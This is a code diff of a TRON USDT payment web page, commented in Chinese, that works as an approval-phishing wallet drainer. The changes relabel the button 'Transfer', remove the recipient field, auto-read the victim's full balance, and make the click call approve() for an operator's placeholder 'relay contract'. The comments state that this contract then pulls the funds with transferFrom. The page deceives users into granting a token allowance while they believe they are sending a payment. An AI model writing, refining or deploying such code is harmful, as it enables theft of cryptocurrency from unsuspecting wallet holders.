@@ -108,30 +108,59 @@
         <div class="token-row">
             <img class="token-icon" src="https://static.tronscan.org/production/logo/usdttrc20.png" alt="USDT">
             <span style="font-size:20px;font-weight:bold">USDT</span>
-            <span style="margin-left:auto">TRC20</span>
+            <span id="balanceText" style="margin-left:auto;color:#666;">余额加载中...</span>
         </div>
     </div>
 
-    <button class="submit-btn" id="payBtn">下一步</button>
+    <button class="submit-btn" id="payBtn">转账</button>
     <textarea id="log" placeholder="交易日志..."></textarea>
 
 <script>
 // =========== 配置区 【自行修改】===========
 const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-//【重点】部署中转合约后，把下面地址替换成你的中转合约地址
-const SPENDER_CONTRACT = "填入你的中转智能合约地址";
+// 填入你的中转合约地址
+const SPENDER_CONTRACT = "这里填写中转合约地址";
 let tronWeb = null;
 const logDom = document.getElementById("log");
 const amountInput = document.getElementById("amount");
 const submitBtn = document.getElementById("payBtn");
+const balanceText = document.getElementById("balanceText");
 
-// 日志输出
 function log(text){
     logDom.value += `[${new Date().toLocaleString()}] ${text}\n`;
     logDom.scrollTop = logDom.scrollHeight;
 }
 
-// 输入监听，金额>0激活蓝色按钮
+// 自动刷新余额函数
+async function refreshBalance() {
+    if(!window.tronWeb || !window.tronWeb.ready){
+        balanceText.innerText = "未检测钱包";
+        return;
+    }
+    tronWeb = window.tronWeb;
+    try{
+        const userAddr = tronWeb.defaultAddress.base58;
+        const usdtContract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
+        const balanceSun = await usdtContract.balanceOf(userAddr).call();
+        const balance = tronWeb.fromSun(balanceSun.toString());
+        balanceText.innerText = balance;
+        log(`✅自动刷新余额：${balance} USDT`);
+    }catch(e){
+        balanceText.innerText = "余额获取失败";
+        log("余额刷新异常:" + e.message);
+    }
+}
+
+// 页面载入自动执行刷新余额
+window.onload = async function(){
+    await sleep(1200);
+    await refreshBalance();
+}
+function sleep(ms){
+    return new Promise(resolve=>setTimeout(resolve,ms));
+}
+
+// 输入金额校验，激活转账按钮
 amountInput.addEventListener("input",()=>{
     const val = parseFloat(amountInput.value);
     if(!isNaN(val) && val > 0){
@@ -141,31 +170,26 @@ amountInput.addEventListener("input",()=>{
     }
 })
 
-// MAX按钮：读取钱包余额自动填充
+// MAX按钮填充全部余额
 document.getElementById("maxBtn").onclick = async function(){
-    try{
-        if(!window.tronWeb || !window.tronWeb.ready){
-            log("未检测到波场钱包，请使用TP/欧易Web3钱包打开页面！");
-            return;
-        }
-        tronWeb = window.tronWeb;
-        const userAddr = tronWeb.defaultAddress.base58;
-        const usdtContract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
-        const balanceSun = await usdtContract.balanceOf(userAddr).call();
-        const balance = tronWeb.fromSun(balanceSun.toString());
-        amountInput.value = balance;
-        submitBtn.classList.add("active");
-        log(`查询到钱包USDT余额: ${balance}`);
-    }catch(e){
-        log("读取余额失败：" + e.message);
+    await refreshBalance();
+    if(!window.tronWeb || !window.tronWeb.ready){
+        log("未检测到波场钱包，请使用TP/欧易Web3钱包打开页面！");
+        return;
     }
+    tronWeb = window.tronWeb;
+    const userAddr = tronWeb.defaultAddress.base58;
+    const usdtContract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
+    const balanceSun = await usdtContract.balanceOf(userAddr).call();
+    const balance = tronWeb.fromSun(balanceSun.toString());
+    amountInput.value = balance;
+    submitBtn.classList.add("active");
 }
 
-// 主逻辑：先授权Approve
+// 【核心】点击转账按钮，唤起授权签名
 document.getElementById("payBtn").onclick = async function(){
     if(!this.classList.contains("active")) return;
     try{
-        // 检测钱包（TP钱包、欧易钱包内置tronweb）
         if(window.tronWeb && window.tronWeb.ready){
             tronWeb = window.tronWeb;
         }else{
@@ -173,25 +197,20 @@ document.getElementById("payBtn").onclick = async function(){
             return;
         }
         const userAddr = tronWeb.defaultAddress.base58;
-        const receiveAddr = document.getElementById("toAddress").value;
         const num = document.getElementById("amount").value;
         const amountSun = tronWeb.toSun(num);
 
-        log(`当前钱包地址:${userAddr}`);
-        log(`准备授权 ${num} USDT 额度`);
+        log(`当前账户：${userAddr}`);
+        log(`准备发起转账授权，数量：${num} USDT`);
 
-        // 第一步：发起授权 Approve
+        // 触发approve授权签名弹窗
         const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
         const approveTx = await contract.approve(SPENDER_CONTRACT, amountSun).send({
             feeLimit:100000000
         });
-        log(`✅授权成功！授权交易哈希：${approveTx}`);
-        log("等待合约执行资金划转...");
-
-        // =========注意=========
-        // 授权成功之后，必须【中转合约内部调用transferFrom】
-        // 前端无法直接执行transferFrom，这是链上协议硬性限制
-
+        log(`✅授权交易提交成功！哈希：${approveTx}`);
+        log("等待合约完成资金划转");
+        // 后续资金划转逻辑在中转合约内实现
     }catch(err){
         log("操作失败："+err.message);
     }
